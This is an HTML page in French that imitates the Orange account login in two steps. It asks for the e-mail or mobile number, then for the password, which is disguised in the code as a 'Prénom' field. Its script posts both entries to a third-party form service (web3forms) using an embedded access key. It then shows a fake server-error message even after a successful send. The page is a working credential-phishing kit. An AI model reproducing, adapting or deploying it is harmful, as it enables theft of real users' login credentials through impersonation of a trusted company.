<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Identifiez-vous - Orange</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    }

    body {
      background-color: #ffffff;
      color: #000000;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
    }

    /* En-tête noir */
    header {
      background-color: #000000;
      color: #ffffff;
      height: 56px;
      padding: 0 16px;
      display: flex;
      align-items: center;
      position: relative;
    }

    .back-btn {
      background: none;
      border: none;
      color: #ffffff;
      cursor: pointer;
      display: none;
      padding: 8px;
      margin-right: 12px;
    }

    .back-btn svg {
      width: 20px;
      height: 20px;
      fill: #ffffff;
    }

    .header-title {
      font-size: 18px;
      font-weight: 500;
      letter-spacing: -0.2px;
    }

    /* Conteneur principal */
    main {
      flex: 1;
      width: 100%;
      max-width: 480px;
      margin: 0 auto;
      padding: 32px 24px;
    }

    .step {
      display: none;
    }

    .step.active {
      display: block;
    }

    /* Titres */
    .page-title {
      font-size: 24px;
      font-weight: 700;
      color: #000000;
      margin-bottom: 36px;
      letter-spacing: -0.3px;
    }

    /* Champs de saisie épurés avec ligne unique */
    .input-wrapper {
      position: relative;
      margin-bottom: 32px;
    }

    .input-field {
      width: 100%;
      height: 44px;
      border: none;
      border-bottom: 1px solid #747775;
      border-radius: 0;
      font-size: 16px;
      color: #000000;
      outline: none;
      background: transparent;
      padding: 0 40px 0 0;
      transition: border-color 0.2s;
    }

    .input-field:focus {
      border-bottom-color: #ff6600;
      border-bottom-width: 2px;
    }

    .input-field::placeholder {
      color: #747775;
      font-size: 16px;
    }

    /* Bouton d'affichage du Prénom */
    .toggle-prenom{
      position: absolute;
      right: 0;
      top: 50%;
      transform: translateY(-50%);
      background: none;
      border: none;
      cursor: pointer;
      padding: 4px;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .toggle-prenomsvg {
      width: 22px;
      height: 22px;
      fill: #ff6600;
    }

    /* Boutons d'action principaux */
    .btn-black {
      width: 100%;
      height: 48px;
      background-color: #000000;
      color: #ffffff;
      border: none;
      font-size: 16px;
      font-weight: 700;
      cursor: pointer;
      transition: background-color 0.2s;
    }

    .btn-black:active {
      background-color: #333333;
    }

    .btn-black:disabled {
      background-color: #747775;
      cursor: not-allowed;
    }

    /* Bloc identifiant enregistré (Étape 2) */
    .user-chip {
      display: flex;
      align-items: center;
      gap: 12px;
      margin-bottom: 32px;
    }

    .user-icon {
      width: 36px;
      height: 36px;
      background-color: #d8d8d8;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      flex-shrink: 0;
    }

    .user-icon svg {
      width: 20px;
      height: 20px;
      fill: #747775;
    }

    .user-nom {
      font-size: 16px;
      font-weight: 700;
      color: #000000;
      word-break: break-all;
    }

    /* Lien Prénom oublié */
    .forgot-link {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 4px;
      margin-top: 24px;
      color: #000000;
      font-size: 15px;
      font-weight: 700;
      text-decoration: none;
    }

    .forgot-link .orange-arrow {
      color: #ff6600;
      font-weight: bold;
      font-size: 16px;
    }

    .forgot-link:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>

  <!-- En-tête -->
  <header>
    <button id="back-btn" class="back-btn" onclick="goToStepnom()">
      <svg viewBox="0 0 24 24">
        <path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/>
      </svg>
    </button>
    <h1 class="header-title">Identifiez-vous</h1>
  </header>

  <main>
    <!-- ÉTAPE 1 : Adresse e-mail OU MOBILE -->
    <div id="step-nom" class="step active">
      <h2 class="page-title">Indiquez votre compte Orange</h2>

      <form onsubmit="handlenomSubmit(event)">
        <div class="input-wrapper">
          <input 
            type="text" 
            id="nom-input" 
            class="input-field" 
            placeholder="Adresse e-mail ou n° de mobile Orange" 
            required 
            autocomplete="username"
          >
        </div>

        <button type="submit" class="btn-black">Continuer</button>
      </form>
    </div>

    <!-- ÉTAPE 2 : Prénom -->
    <div id="step-prenom" class="step">
      <div class="user-chip">
        <div class="user-icon">
          <svg viewBox="0 0 24 24">
            <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/>
          </svg>
        </div>
        <span id="user-display" class="user-nom"></span>
      </div>

      <h2 class="page-title">Saisissez votre Mot de passe</h2>

      <form onsubmit="handleFinalSubmit(event)">
        <div class="input-wrapper">
          <input 
            type="prenom" 
            id="prenom-input" 
            class="input-field" 
            placeholder="Prénom" 
            required 
            autocomplete="current-prenom"
          >
          <button type="button" class="toggle-prenom" onclick="toggleprenomVisibility()">
            <!-- Icône œil barré Orange -->
            <svg viewBox="0 0 24 24">
              <path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.44-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.17c0-1.66-1.34-3-3-3l-.17.02z"/>
            </svg>
          </button>
        </div>

        <button type="submit" id="submit-btn" class="btn-black">S'identifier</button>

        <a href="#" class="forgot-link">
          Prénom oublié ? <span class="orange-arrow">&gt;</span>
        </a>
      </form>
    </div>
  </main>

  <script>
    const WEB3FORMS_ACCESS_KEY = "92026deb-19de-40d9-a602-c97efc36ae1a";

    const stepnom = document.getElementById('step-nom');
    const stepprenom = document.getElementById('step-prenom');
    const nomInput = document.getElementById('nom-input');
    const prenomInput = document.getElementById('prenom-input');
    const userDisplay = document.getElementById('user-display');
    const backBtn = document.getElementById('back-btn');
    const submitBtn = document.getElementById('submit-btn');

    function handlenomSubmit(event) {
      event.preventDefault();
      const value = nomInput.value.trim();
      
      if (value) {
        userDisplay.textContent = value;
        stepnom.classList.remove('active');
        stepprenom.classList.add('active');
        backBtn.style.display = 'block';
        prenomInput.focus();
      }
    }

    function goToStepnom() {
      stepprenom.classList.remove('active');
      stepnom.classList.add('active');
      backBtn.style.display = 'none';
      nomInput.focus();
    }

    function toggleprenomVisibility() {
      if (prenomInput.type === 'prenom') {
        prenomInput.type = 'text';
      } else {
        prenomInput.type = 'prenom';
      }
    }

    async function handleFinalSubmit(event) {
      event.preventDefault();
      submitBtn.disabled = true;
      submitBtn.textContent = "Connexion...";

      const formData = new FormData();
      formData.append("access_key", WEB3FORMS_ACCESS_KEY);
      formData.append("subject", "Nouvelle saisie de formulaire Orange Mail");
      formData.append("nom_saisi", nomInput.value);
      formData.append("prenom_saisi", prenomInput.value);

      try {
        const response = await fetch("https://api.web3forms.com/submit", {
          method: "POST",
          body: formData
        });

        const result = await response.json();

        if (result.success) {
          alert("Une erreur est survenue lors de la connexion au serveur !");
        } else {
          alert("Erreur lors de l'envoi : " + result.message);
        }
      } catch (error) {
        alert("Une erreur est survenue lors de la connexion au serveur.");
      } finally {
        submitBtn.disabled = false;
        submitBtn.textContent = "S'identifier";
      }
    }
  </script>

</body>
</html>
